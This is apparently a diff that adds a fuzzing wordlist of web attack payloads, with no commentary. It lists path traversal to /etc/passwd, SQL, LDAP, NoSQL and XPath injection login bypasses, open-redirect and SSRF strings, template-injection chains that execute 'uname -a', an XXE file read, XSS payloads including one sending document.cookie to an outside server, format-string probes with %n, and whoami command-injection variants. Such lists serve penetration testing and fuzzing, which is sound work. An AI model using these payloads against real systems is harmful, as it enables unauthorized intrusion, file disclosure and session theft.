@@ -1,0 +1,150 @@
+../../../../../../etc/passwd%00
+..//..//..//..//..//..//etc/passwd%00
+....//....//....//....//....//....//etc/passwd%00
+cannary'||1==1%00
+cannary)(cn=*)%00
+cannary)((cn=*))%00
+cannary'&&this.password.match(/.*/)%00
+?uri=https://webhook.site
+?uri=//webhook.site
+//webhook.site
+admin' or 1=1 -- 
+'admin'' or 1=1' -- 
+admin' or '1'='1 -- 
+admin' or '1'='1'
+admin" or 1=1 -- 
+"admin or 1=1 -- 
+admin" or '1="1 -- 
+admin' or 1=1 LIMIT 1 -- 
+admin'%20or1=1%20-- 
+admin%27%09or%091%3D1%09--%09
+admin%27||1%3D1%23
+admin%27OR1%3D1%23
+admin%bf%27%20or%201%3D1%20--%20
+admin%bf%27+or+1=1+--+
+admin%bf%27%20or%201=1%20--%20
+./google.com
+.google.com
+/google.com
+//google.com
+//\\//google.com
+\\google.com
+//////google.com
+//.//.//.google.com
+{{7*7}}
+{{'7'*7}}
+{{''.__class__}}
+{{''.__class__.mro()[0]}}
+{{''.__class__.mro()[0].__subclasses__()}}
+{{''.__class__.mro()[0].__subclasses__()['X']["uname", "-a"]}}
+{{[].__class__.base.subclasses()}}
+{{[].class.base.subclasses()}}
+{{''.class.mro()[2].subclasses()}}
+{{''.__class__.mro()[2].__subclasses__()}}
+{{_self.env.registerUndefinedFilterCallback('exec')}}{{_self.env.getFilter('uname')}}
+{{_self.env.registerUndefinedFilterCallback('exec')}}{{_self.env.getFilter('uname')}}
+<!DOCTYPE test [<!ENTITY x SYSTEM "file:///etc/passwd">]><test>%26x;</test>
+cannary'%20or%201=1]/parent::*/child::node()%00
+Cann<img src='x' onerror="alert('document.domain')"/>Arry
+Cann<img src='x' onerror="document.write('49f9e5e6-6023-4b86-8977-1eb5593bcd7e')"/>Arry
+<script>eval('al'+'ert(1)');</script>
+eval(atob('amF2YXNjcmlwdDphbGVydCgxKQ'));
+'alert(1)'.replace(/.+/,eval)
+alert(document['cookie'])
+<img onerror=eval('al&#x5c;u0065rt(1)') src=a>
+;alert(1); var $b= "
+<img src=x onError=import('//1152848220/')>
+<x onauxclick=import('//IP/')>click
+<x onauxclick=import('//IP/')>click
+"/><script>alert(1)</script>
+<script>document.write('<img src="https://myserver/?c='%2bdocument.cookie%2b'"/>')</script>
+%p%p%p%p
+%p%p%p%p%p%p%p%p%p%p
+%p * 55
+%p * 129
+%p * 257
+%p * 513
+%x%x%x%x
+%x%x%x%x%x%x%x%x%x%x
+%x * 55
+%x * 129
+%x * 257
+%x * 513
+%d%d%d%d
+%d%d%d%d%d%d%d%d%d%d
+%d * 55
+%d * 129
+%d * 257
+%d * 513
+%s%s%s%s
+%s%s%s%s%s%s%s%s%s%s
+%s * 55
+%s * 129
+%s * 257
+%s * 513
+%n%n%n%n
+%n%n%n%n%n%n%n%n%n%n
+%n * 55
+%n * 129
+%n * 257
+%n * 513
+%u%u%u%u
+%u%u%u%u%u%u%u%u%u%u
+%u * 55
+%u * 129
+%u * 257
+%u * 513
+%%%%%%%%
+%%%%%%%%%%%%%%%%%%%%
+%% * 55
+%% * 129
+%% * 257
+%% * 513
+%s%p%x%d
+%s%p%x%d%s%p%x%d%s%p%x%d
+%s%p%x%d * 55
+%s%p%x%d * 129
+%s%p%x%d * 257
+%s%p%x%d * 513
+.1024d
+%.2049d
+%99999999999s
+%08x
+%%20d
+%%20n
+%%20x
+%%20s
+%#0123456x%08x%x%s%p%d%n%o%u%c%h%l%q%j%z%Z%t%i%e%g%f%a%C%S%08x%%
+%s%p%x%d
+.1024d
+%.2049d
+%p%p%p%p
+%x%x%x%x
+%d%d%d%d
+%s%s%s%s
+%99999999999s
+%08x
+%%20d
+%%20n
+%%20x
+%%20s
+%s%s%s%s%s%s%s%s%s%s
+%p%p%p%p%p%p%p%p%p%p
+%#0123456x%08x%x%s%p%d%n%o%u%c%h%l%q%j%z%Z%t%i%e%g%f%a%C%S%08x%%
+%s x 129
+%x x 257
+||whoami
+|whoami
+|||whoami
+`whoami`
+&whoami
+&&whoami
+||'w'h'o'a'm'i'
+|||'w'h'o'a'm'i'
+|'w'h'o'a'm'i'
+`'w'h'o'a'm'i'`
+&'w'h'o'a'm'i'
+&&'w'h'o'a'm'i'
+
+
+
